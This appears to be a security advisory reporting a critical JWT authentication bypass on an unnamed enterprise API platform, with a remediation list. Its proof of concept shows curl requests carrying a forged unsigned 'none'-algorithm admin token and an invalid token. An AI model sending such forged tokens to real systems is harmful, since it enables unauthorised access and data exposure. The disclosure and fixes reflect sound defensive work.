AUTHENTICATION LAYER SYSTEMIC BYPASS

Discovery Date: November 2024
Disclosure Date: November 2024
Vendor Status: Investigating
CVSS Score: 9.1 (Critical)

Executive Summary
Identified complete authentication bypass in enterprise API platform through systemic JWT validation failures, accepting tokens with invalid signatures, insecure algorithms, and arbitrary claims without cryptographic verification.

Technical Details

JWT validation accepts none algorithm tokens

No signature verification for RS256/HS256 algorithms

Arbitrary key ID (KID) values accepted without verification

No structural validation of token claims or expiration

Proof of Concept


# All tokens return HTTP 200 - No validation
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
https://api.platform.com/health

curl -H "Authorization: Bearer invalid.signature.here" \
https://api.platform.com/health
Impact

Complete platform authentication compromise

Customer data exposure and API configuration access

Service takeover through administrative claim injection

Enterprise trust and reputation damage

Remediation

Implement proper JWT validation using standard libraries

Reject tokens with none algorithm

Verify signatures against trusted public keys

Add token expiration and claim validation
